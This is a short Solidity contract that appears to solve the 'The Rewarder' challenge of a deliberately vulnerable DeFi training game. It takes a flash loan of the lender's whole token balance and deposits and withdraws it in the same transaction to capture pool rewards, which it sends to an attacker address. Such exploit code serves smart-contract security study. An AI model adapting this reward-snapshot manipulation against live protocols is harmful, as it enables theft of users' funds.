//SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderAttack {
    IFlashLoanerPool loaner;
    ITheRewarderPool rewarder;
    IERC20 DVT;
    IERC20 reward;

    constructor (address _loaner, address _rewarder,address _DVT,address _reward) {
        loaner = IFlashLoanerPool(_loaner);
        rewarder = ITheRewarderPool(_rewarder);   
        DVT =  IERC20(_DVT);
        reward= IERC20(_reward);
    }

    function attack(address attacker) external {
        (bool success, bytes memory data) = address(DVT).staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, loaner));
        require(success);
        uint amount = abi.decode(data , (uint));
        loaner.flashLoan(amount);
        uint rewardUint = reward.balanceOf(address(this));
        reward.transfer(attacker, rewardUint);
    }

    function receiveFlashLoan(uint256 amount) external {
        DVT.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        DVT.transfer(address(loaner), amount);
    }
}